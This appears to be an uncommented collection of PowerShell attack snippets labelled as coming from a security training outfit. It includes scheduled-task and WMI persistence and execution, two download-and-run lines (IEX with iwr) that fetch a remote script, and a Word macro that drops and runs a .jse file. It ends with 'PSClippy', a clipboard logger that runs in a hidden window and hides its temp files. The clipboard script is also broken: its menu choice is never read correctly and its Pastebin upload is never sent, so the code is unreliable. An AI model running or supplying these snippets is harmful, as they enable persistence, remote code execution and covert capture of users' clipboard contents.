# By Threats Experts University

$Action = New-ScheduledTaskAction -Execute "cmd.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction

$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
$NewClass = $Class.Derive("Win32_Atomic")
$NewClass.Put()
Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe



[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "C:\temp\macrocode.txt" -officeProduct "Word" -sub "Scheduler"


$xml = [System.IO.File]::ReadAllText("C:\temp\WMI.xml")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }

$xml = [System.IO.File]::ReadAllText("C:\temp\SCTHIDDENATTRIB.xml")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }



wmic /node:127.0.0.1 process call create "rundll32.exe C:\temp\calc.dll StartW"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\studentadmin\Desktop\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\studentadmin\Desktop\art.jse`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

# By Threats Experts University
# Keeps clipboard from User's recent copies as a txt. File
# Note: Always choose option 2 since pastebin option doesnt work
 Write-Output ""

     $clpo = @('
    
        Clippy Options:
            1. Upload To PasteBin
            2. Copy To File
    
    
    ')

    $clpo 
    
    $clpc = Read-Host -Prompt " [Option]:"


        
    if ($record -eq "p" -or $record -eq "P"){

    Write-Output " [*] PasteBin Selected ..."
    Write-Output " [*] Prompting For PasteBin Details ..."

    $pasteapikey = Read-Host -Prompt " [API Key]:"
    $pastename = Read-Host -Prompt " [Paste Name]:"

        if ($pastename -eq $null) {
        
        $pastename = "PSClippy"
        
        }

        Write-Host " [*] Creating Temp Files ..."

        $pasteapikey >> C:\temp\api.txt
        $pastename >> C:\temp\pastename.txt

        attrib +h "C:\temp\api.txt"
        attrib +h "C:\temp\pastename.txt"

        Write-Host " [*] Files Hidden ..."

    } else {

        $filechoice = 1

        Write-Host " [*] Prompting For Output File Location (TXT File Supported) ..."

        $fileloc = Read-Host -Prompt " [Location]:"

        Write-Output ""

            while ($fileloc.EndsWith(".txt") -eq $false){ 

            Write-Output ""

            Write-Host " Incorrect Value Entered ..." -ForegroundColor Red

            $fileloc = Read-Host -Prompt " [Location]:"

            }

            Write-Host " [*] Creating Temp Files ..."

            $fileloc >> C:\temp\file.txt
            attrib +h "C:\temp\file.txt"

            Write-Host " [*] Files Hidden ..."

        }

        Write-Output ""

 Write-Host " [*] Starting PSClippy ..."
 Write-Host " [*] Removing Temp Files ..."

 PowerShell.exe -windowstyle hidden {

 Write-Output ""

 

 $testfile = Test-Path -Path C:\temp\file.txt
 $testpaste = Test-Path -Path C:\temp\api.txt

    if ($testfile -eq "True"){

        $filechoice = 1
        $fileloc = Get-Content C:\temp\file.txt

        Remove-Item C:\temp\file.txt -Force

        

    }

    if ($testpaste -eq "True"){

    $pastechoice = 1
    $pasteapikey = Get-Content C:\temp\api.txt
    $pastename = Get-Content C:\temp\pastename.txt

    Remove-Item C:\temp\pastename.txt -Force
    Remove-Item C:\temp\api.txt -Force

    

    }



 $pclip = ""
 $array = @()
 $counter = 0



    while($true){

    # Get Clipboard

    $cclip = Get-Clipboard


        if ($pclip -eq $cclip){

        #Do Nothing
        
        } else {


        $array += $cclip
        $pclip = $cclip
        $cclip = Get-Clipboard


        $counter++

            if ($filechoice -eq 1){

            $pclip >> $fileloc

            }

        }

    if ($pastechoice -eq 1){


    # At 10, upload to PasteBin. You will need to add your API key *

        if ($counter -gt 9){


        # Format Paste

 $Body = @{    api_dev_key = ‘$pasteapikey’

    api_paste_code = (“$array”)

    api_paste_private = 0

    api_paste_name = ‘$pastename’

    api_option = ‘paste’

    api_user_key = ”"
 }




} # End of if paste = 1


Start-Sleep -Seconds 5


} 


} # Hidden
    }
    




   

 




